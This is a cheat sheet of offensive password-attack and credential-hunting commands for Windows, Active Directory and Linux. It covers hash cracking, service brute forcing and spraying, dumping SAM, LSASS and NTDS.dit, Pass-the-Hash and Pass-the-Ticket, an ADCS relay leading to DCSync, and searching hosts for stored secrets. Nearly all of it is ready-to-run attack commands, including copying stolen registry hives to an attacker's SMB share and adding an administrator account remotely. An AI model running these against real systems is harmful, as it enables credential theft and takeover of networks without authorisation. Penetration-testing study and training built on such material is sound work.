# Password Attacks & Credential Hunting

HaveIBeenPwned: https://haveibeenpwned.com | rockyou.txt: `/usr/share/wordlists/rockyou.txt` | SecLists: `/usr/share/seclists/`

---

## Hash Identification

```bash
hashid -j <HASH>          # identify hash + JtR format
hashid -m <HASH>          # identify hash + hashcat mode
```

Hash format reference: https://hashcat.net/wiki/doku.php?id=example_hashes JtR sample hashes: https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

Common hash formats:

|Hash|Hashcat Mode|JtR Format|
|---|---|---|
|MD5|0|raw-md5|
|NTLM/NT|1000|nt|
|SHA1|100|raw-sha1|
|SHA-256|1400|raw-sha256|
|SHA-512|1700|raw-sha512|
|sha512crypt ($6$)|1800|sha512crypt|
|MD5crypt ($1$)|500|md5crypt|
|bcrypt ($2a$)|3200|bf|
|DCC2 (MSCache2)|2100|mscach2|
|NetNTLMv2|5600|netntlmv2|
|NetNTLMv1|5500|netntlm|
|Kerberos AS-REP|18200|krb5asrep|
|Kerberos TGS|13100|krb5tgs|
|BitLocker|22100|—|
|WPA/WPA2 PMKID|22000|—|
|DPAPI masterkey|15900|—|

---

## John the Ripper (JtR)

```bash
# Single crack (rule-based on username/GECOS info — best for /etc/shadow)
john --single passwd

# Wordlist attack
john --wordlist=<WORDLIST> <HASH_FILE>
john --wordlist=rockyou.txt --rules=best64 <HASH_FILE>

# Incremental (brute-force with Markov chains)
john --incremental <HASH_FILE>

# Specify format
john --format=nt --wordlist=rockyou.txt <HASH_FILE>

# Show cracked
john <HASH_FILE> --show

# Unshadow Linux /etc/passwd + /etc/shadow for cracking
unshadow /etc/passwd /etc/shadow > unshadowed.hashes
john --wordlist=rockyou.txt unshadowed.hashes
```

---

## Hashcat

```bash
# Basic syntax
hashcat -a <MODE> -m <TYPE> <HASHES> [wordlist/mask]

# -a 0 Dictionary attack
hashcat -a 0 -m 0 hashes.txt rockyou.txt
hashcat -a 0 -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# -a 3 Mask attack (brute-force with defined keyspace)
hashcat -a 3 -m 0 hash.txt '?u?l?l?l?l?d?s'   # e.g. Aaaaa1!

# Generate mutated wordlist (stdout, no cracking)
hashcat --force wordlist.txt -r custom.rule --stdout | sort -u > mut_passwords.txt

# Rules location
ls /usr/share/hashcat/rules/
# best64.rule, dive.rule, d3ad0ne.rule, rockyou-30000.rule
```

Mask charset symbols:

- `?l` = lowercase `?u` = uppercase `?d` = digits `?s` = symbols `?a` = all printable `?h` = hex lower `?H` = hex upper

Custom charset: `-1 <chars>` then use `?1` in mask.

---

## Custom Wordlists

Hashcat rule functions:

- `:` = no-op, `c` = capitalize, `l` = lowercase, `u` = uppercase
- `so0` = replace o→0, `sa@` = replace a→@
- `$!` = append `!`

Sample rule file:

```
:
c
so0
c so0
sa@
c sa@ so0
$!
$! c so0 sa@
```

```bash
# Generate mutations
hashcat --force wordlist.txt -r custom.rule --stdout | sort -u > mut_passwords.txt

# CeWL — scrape company website for likely passwords
cewl https://www.target.com -d 4 -m 6 --lowercase -w target.wordlist

# Username Anarchy
./username-anarchy -i names.txt > usernames.txt
```

---

## Cracking Protected Files

```bash
# File 2john conversion pattern
<tool> <file> > hash.txt; john --wordlist=rockyou.txt hash.txt; john hash.txt --show

# SSH private key
ssh2john.py id_rsa > ssh.hash
# Check if key is password-protected
ssh-keygen -yf id_rsa       # prompts = protected

# Office documents
office2john.py Protected.docx > doc.hash

# PDF
pdf2john.py doc.pdf > pdf.hash

# ZIP archive
zip2john archive.zip > zip.hash

# RAR archive
rar2john archive.rar > rar.hash

# KeePass database
keepass2john database.kdbx > keepass.hash

# BitLocker VHD
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
hashcat -a 0 -m 22100 backup.hash rockyou.txt

# Mount BitLocker on Linux after cracking
sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u<PASSWORD> -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

# OpenSSL-encrypted GZIP
for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz; done

# Find all *2john tools
locate *2john*
```

---

## Network Service Brute Forcing

**NetExec (nxc/netexec)** — multi-protocol:

```bash
netexec <proto> <TARGET> -u <USER/LIST> -p <PASS/LIST>
netexec winrm <TARGET> -u users.txt -p passwords.txt
netexec smb <TARGET> -u users.txt -p passwords.txt
netexec ssh <TARGET> -u admin -p passwords.txt
netexec rdp <TARGET> -u users.txt -p passwords.txt
netexec smb <SUBNET>/24 -u admin -p 'Password1!'   # spraying

# Credential stuffing (user:pass format)
netexec smb <TARGET> -u user_pass.list -p ''
# Or with -C for combo file (user:pass per line)

# Dump SAM/LSA/NTDS remotely
netexec smb <TARGET> --local-auth -u admin -p <PASS> --sam
netexec smb <TARGET> --local-auth -u admin -p <PASS> --lsa
netexec smb <TARGET> -u admin -p <PASS> -M ntdsutil   # NTDS.dit dump

# Check shares + permissions
netexec smb <TARGET> -u admin -p <PASS> --shares

# Execute command
netexec smb <TARGET> -u admin -p <PASS> -x whoami

# Spider share for content pattern
netexec smb <TARGET> -u admin -p <PASS> --spider <SHARE> --content --pattern "passw"

# Result meaning: (Pwn3d!) = local admin confirmed
```

**Hydra:**

```bash
hydra -L users.txt -P passwords.txt ssh://<TARGET>
hydra -L users.txt -P passwords.txt rdp://<TARGET> -t 4 -W 3
hydra -L users.txt -P passwords.txt smb://<TARGET>
hydra -C user_pass.txt ssh://<TARGET>        # credential stuffing
```

**Evil-WinRM:**

```bash
sudo gem install evil-winrm
evil-winrm -i <TARGET> -u <USER> -p <PASS>
evil-winrm -i <TARGET> -u Administrator -H <NTLM_HASH>   # Pass-the-Hash
evil-winrm -i <TARGET> -r <DOMAIN>                        # Kerberos auth (needs KRB5CCNAME)
```

**SMB via Metasploit (SMBv3 fallback):**

```
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**Default creds tool:**

```bash
pip3 install defaultcreds-cheat-sheet
creds search <product>    # e.g. creds search linksys
```

---

## Attacking SAM/SYSTEM/SECURITY

Hive files needed:

- `HKLM\SAM` — local account hashes
- `HKLM\SYSTEM` — boot key (needed to decrypt SAM)
- `HKLM\SECURITY` — cached domain creds (DCC2), DPAPI keys

```cmd
# Windows (admin cmd) — dump hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Transfer to attacker via impacket SMB server, then:

```bash
# Attacker — start SMB server
sudo impacket-smbserver CompData /tmp/loot -smb2support

# Windows — copy files
move sam.save \\<LHOST>\CompData
move system.save \\<LHOST>\CompData
move security.save \\<LHOST>\CompData
```

```bash
# Offline dump (attacker)
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL

# Remote dump (if creds available)
netexec smb <TARGET> --local-auth -u admin -p <PASS> --sam
netexec smb <TARGET> --local-auth -u admin -p <PASS> --lsa
```

Output format: `username:RID:LMhash:NThash:::`

```bash
# Crack NT hashes
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

# Crack DCC2 (domain cached creds) — much slower ~800x
hashcat -m 2100 '$DCC2$10240#<user>#<hash>' rockyou.txt
```

> [!warning] DCC2 cannot be used for Pass-the-Hash. Crack to plaintext first. NT hashes can be used directly for PtH.

---

## Attacking LSASS

LSASS stores: NT hashes (MSV), Kerberos tickets/keys, DPAPI masterkeys. Optionally cleartext (WDIGEST — disabled Win8+).

**GUI method (interactive session):** Task Manager → Details → lsass.exe → Create dump file → `%temp%\lsass.DMP`

**CLI method (no GUI):**

```powershell
# Get PID
Get-Process lsass
# or
tasklist /svc | findstr lsass

# Create dump (needs elevation; flagged by modern AV)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

**Parse dump on Linux:**

```bash
pip3 install pypykatz
pypykatz lsa minidump lsass.dmp
```

Key output sections: MSV (NT+SHA1 hashes), Kerberos (tickets), WDIGEST (cleartext if enabled), DPAPI (masterkey).

```bash
# Crack extracted NT hash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b rockyou.txt
```

---

## Attacking NTDS.dit

NTDS.dit = AD database on Domain Controllers. Contains all domain user hashes. Requires domain admin or equivalent.

```bash
# 1. Enumerate AD users with kerbrute
./kerbrute_linux_amd64 userenum --dc <DC_IP> --domain <DOMAIN> names.txt

# 2. Brute-force SMB for domain creds
netexec smb <DC_IP> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

# 3. Connect to DC
evil-winrm -i <DC_IP> -u <USER> -p <PASS>
```

```powershell
# On DC — create VSS copy and extract NTDS.dit
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
# Also need SYSTEM hive for boot key
reg.exe save hklm\system C:\NTDS\SYSTEM.save
```

```bash
# Quick one-liner via NetExec
netexec smb <DC_IP> -u <USER> -p <PASS> -M ntdsutil

# Offline extraction
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

Output: `username:RID:LMhash:NThash:::` for all domain accounts.

```bash
# Crack
hashcat -m 1000 ntds_hashes.txt rockyou.txt
```

---

## Windows Credential Manager

```cmd
# List stored credentials
cmdkey /list

# Impersonate stored cred via runas
runas /savecred /user:<DOMAIN>\<USER> cmd
```

```
# Mimikatz — dump Credential Manager from LSASS
privilege::debug
sekurlsa::credman

# Dump DPAPI browser credentials
dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

Stored vault locations:

- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`

---

## Pass the Hash (PtH)

PtH uses NTLM hash directly for authentication — no plaintext needed. Works because NTLM doesn't salt hashes per session.

**Mimikatz (Windows):**

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /run:cmd.exe" exit
```

**Invoke-TheHash (Windows, PowerShell):**

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "net user <USER> <PASS> /add && net localgroup administrators <USER> /add"
Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "<CMD>"
```

**Impacket (Linux):**

```bash
impacket-psexec <USER>@<TARGET> -hashes :<NTLM_HASH>
impacket-wmiexec <USER>@<TARGET> -hashes :<NTLM_HASH>
impacket-smbexec <USER>@<TARGET> -hashes :<NTLM_HASH>
# Format: LMhash:NThash (use aad3b435b51404eeaad3b435b51404ee for empty LM)
```

**NetExec (Linux):**

```bash
netexec smb <SUBNET>/24 -u Administrator -d . -H <NTLM_HASH>       # spray subnet
netexec smb <TARGET> -u Administrator -d . -H <NTLM_HASH> -x whoami # exec command
netexec smb <TARGET> --local-auth -u admin -H <NTLM_HASH>           # local auth
# (Pwn3d!) = local admin confirmed
```

**Evil-WinRM:**

```bash
evil-winrm -i <TARGET> -u Administrator -H <NTLM_HASH>
```

**xfreerdp (RDP PtH):**

```bash
# Must enable Restricted Admin Mode first
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v:<TARGET> /u:<USER> /pth:<NTLM_HASH>
```

> [!warning] UAC limits PtH for local accounts. By default only RID-500 (Administrator) can PtH remotely. Domain admin accounts bypass this restriction. If `FilterAdministratorToken` is enabled, even RID-500 is blocked.

---

## Pass the Ticket (PtT) — Windows

Kerberos ticket types: TGT (get any TGS), TGS (access specific service).

**Export tickets with Mimikatz:**

```cmd
privilege::debug
sekurlsa::tickets /export       # exports .kirbi files
sekurlsa::ekeys                 # extract AES256/RC4 keys for OverPass-the-Hash
```

**Export tickets with Rubeus:**

```cmd
Rubeus.exe dump /nowrap         # base64 encoded
```

**OverPass-the-Hash (hash → TGT):**

```cmd
# Mimikatz
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<HASH>
# Opens new cmd.exe; Kerberos then auto-requests TGT

# Rubeus — request TGT from hash
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<NTLM_HASH> /ptt
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes256:<AES256_HASH> /ptt
```

**Import/inject ticket:**

```cmd
# Rubeus — from file
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-user@krbtgt-domain.kirbi

# Rubeus — from base64
Rubeus.exe ptt /ticket:<BASE64_BLOB>

# Mimikatz — from file
kerberos::ptt "C:\path\to\ticket.kirbi"

# Convert .kirbi to base64 (PowerShell)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))

# Verify imported tickets
klist
```

**PowerShell Remoting with PtT:**

```cmd
# Import ticket then launch PowerShell
mimikatz # kerberos::ptt "ticket.kirbi"
mimikatz # exit
powershell
Enter-PSSession -ComputerName DC01
```

**Rubeus sacrificial process:**

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
# In new window:
Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<HASH> /ptt
powershell
Enter-PSSession -ComputerName DC01
```

---

## Pass the Ticket (PtT) — Linux

**Identify domain-joined Linux:**

```bash
realm list                            # shows domain + permitted users
ps -ef | grep -i "winbind\|sssd"      # check AD integration services
```

**Find Kerberos tickets:**

```bash
# ccache files (active session tickets)
env | grep -i KRB5CCNAME              # current session ticket path
ls -la /tmp/krb5cc_*                  # all ccache files in /tmp

# keytab files (service account credentials)
find / -name *keytab* -ls 2>/dev/null
cat /etc/crontab                      # scripts using kinit often reference keytab
```

**Abuse keytab files:**

```bash
klist -k -t /opt/carlos.keytab        # show principal in keytab
kinit carlos@DOMAIN.COM -k -t /opt/carlos.keytab   # import into session
klist                                 # verify TGT obtained
smbclient //dc01/share -k -c ls       # use ticket
```

**Extract hashes from keytab:**

```bash
python3 /opt/keytabextract.py keytab_file    # extracts NTLM + AES hashes
# NTLM → PtH or crack with hashcat -m 1000
# AES256 → forge tickets or crack
```

**Abuse ccache files (needs root):**

```bash
cp /tmp/krb5cc_647401106_HRJDux /root/
export KRB5CCNAME=/root/krb5cc_647401106_HRJDux
klist
smbclient //dc01/C$ -k -c ls -no-pass
impacket-wmiexec dc01 -k -no-pass
```

**Linux → DC via Impacket (proxychains if needed):**

```bash
# Edit /etc/hosts for name resolution
echo "<DC_IP> dc01.domain.local dc01" >> /etc/hosts

export KRB5CCNAME=/tmp/ticket.ccache
impacket-wmiexec dc01 -k -no-pass
impacket-psexec dc01 -k -no-pass
proxychains impacket-wmiexec dc01 -k
```

**Evil-WinRM with Kerberos (Linux):**

```bash
sudo apt-get install krb5-user -y
# Configure /etc/krb5.conf:
# [libdefaults] default_realm = DOMAIN.COM
# [realms] DOMAIN.COM = { kdc = dc01.domain.com }

evil-winrm -i dc01.domain.local -r domain.local
```

**Convert ticket formats:**

```bash
# ccache (Linux) → kirbi (Windows)
impacket-ticketConverter krb5cc_file output.kirbi

# kirbi (Windows) → ccache (Linux)
impacket-ticketConverter ticket.kirbi output.ccache
```

**Linikatz (automated Linux Kerberos dumper):**

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
sudo ./linikatz.sh    # needs root; extracts all ccache + keytab from system
```

---

## Pass the Certificate (ESC8 / Shadow Credentials)

**ESC8 — ADCS NTLM relay:**

```bash
# 1. Start relay listener
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

# 2. Force target machine to authenticate (printer bug)
python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> <LHOST>

# 3. Relay issues certificate (DC01$.pfx)
# 4. Convert cert to TGT
python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip <DC_IP> '<DOMAIN>/DC01$' /tmp/dc.ccache

# 5. DCSync
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/DC01$'@dc01.<DOMAIN>
```

**Shadow Credentials (msDS-KeyCredentialLink):**

```bash
# AddKeyCredentialLink edge in BloodHound = can write victim's msDS-KeyCredentialLink

# Write public key to victim
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <CONTROLLED_USER> -p <PASS> --target <VICTIM_USER> --action add
# Outputs: <pfx_file>.pfx + password

# Get TGT as victim
python3 gettgtpkinit.py -cert-pfx <file>.pfx -pfx-pass <PFX_PASS> -dc-ip <DC_IP> <DOMAIN>/<VICTIM> /tmp/victim.ccache

# Use TGT
export KRB5CCNAME=/tmp/victim.ccache
evil-winrm -i dc01.<DOMAIN> -r <DOMAIN>
```

PKINITtools: https://github.com/dirkjanm/PKINITtools

---

## Credential Hunting — Windows

```cmd
# findstr — search file contents
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# LaZagne — extract credentials from installed apps
start LaZagne.exe all
start LaZagne.exe -vv all
```

High-value search locations:

- `C:\Windows\Panther\unattend.xml` — deployment passwords
- SYSVOL share — GPP passwords (Group Policy)
- `web.config` on dev/IT shares
- Scripts on IT shares
- KeePass `.kdbx` databases
- AD user/computer Description fields
- Files named pass.txt, passwords.docx, credentials.xlsx

**Snaffler (domain-joined machine, automated share hunt):**

```cmd
Snaffler.exe -s           # auto-discover + search all accessible shares
Snaffler.exe -s -u        # also search for AD usernames in files
```

**PowerHuntShares:**

```powershell
Import-Module .\PowerHuntShares.ps1
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\output
# Generates HTML report
```

---

## Credential Hunting — Linux

```bash
# Config files
for l in $(echo ".conf .config .cnf"); do find / -name "*$l" 2>/dev/null | grep -v "lib\|fonts\|share\|core"; done

# Grep configs for credentials
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do grep "user\|password\|pass" $i 2>/dev/null | grep -v "#"; done

# Database files
for l in $(echo ".sql .db .*db .db*"); do find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"; done

# Scripts
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share"; done

# SSH keys
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

# Bash history — may contain creds in commands
tail -n5 /home/*/.bash*

# Log files — look for auth events
for i in $(ls /var/log/* 2>/dev/null); do GREP=$(grep "accepted\|session opened\|failure\|failed\|ssh\|password changed\|COMMAND=" $i 2>/dev/null); if [[ $GREP ]]; then echo "#### Log: $i"; echo "$GREP"; fi; done

# Cronjobs — may reference keytab/credentials
cat /etc/crontab
ls -la /etc/cron.*/

# Memory — dump cleartext creds
sudo python3 mimipenguin.py
sudo python2.7 laZagne.py all

# Firefox saved passwords
python3.9 firefox_decrypt.py
# or
python3 laZagne.py browsers

# Hunt encrypted files
for ext in $(echo ".xls .xls* .doc .doc* .pdf .pp*"); do find / -name "*$ext" 2>/dev/null | grep -v "lib\|fonts\|share\|core"; done
```

---

## Credential Hunting — Network Traffic

```bash
# Pcredz — extract creds from PCAP
./Pcredz -f capture.pcapng -t -v
# Extracts: FTP, SNMP community strings, IMAP/POP3/SMTP, HTTP basic/forms, NTLMv1/v2, Kerberos AS-REQ

# Wireshark filters
# http.request.method == "POST"           → plaintext form credentials
# http contains "passw"                    → password strings in HTTP
# tcp.stream eq N                          → follow TCP stream
```

MANSPIDER (Linux, remote SMB hunt):

```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <TARGET> -c 'passw' -u <USER> -p <PASS>
```

---

## Linux Authentication Files

```bash
# /etc/passwd — world-readable, uid:gid:GECOS:home:shell
# Password field: x = hashes in /etc/shadow, blank = no password needed

# /etc/shadow — root-only, password hashes
# Format: $<id>$<salt>$<hash>
# Hash IDs: 1=MD5, 5=SHA-256, 6=SHA-512, y=yescrypt (Debian default)

# /etc/security/opasswd — old password hashes (PAM reuse prevention)
sudo cat /etc/security/opasswd
# Note: MD5 ($1$) hashes here are weak → crack and look for reuse patterns

# Crack Linux hashes
cp /etc/passwd /tmp/passwd.bak && cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > unshadowed.hashes
hashcat -m 1800 -a 0 unshadowed.hashes rockyou.txt   # SHA-512 crypt
```

> [!warning] If `/etc/passwd` is world-writable (misconfiguration): delete the `x` password field for root → `su` without password. Rare but impactful.

> [!tip] Priority credential hunting workflow: bash_history → config files (grep pass/user) → scripts → SSH keys → LaZagne → browser creds → memory (mimipenguin). On Windows: LaZagne → findstr → Credential Manager (cmdkey) → browser decrypt → LSASS dump.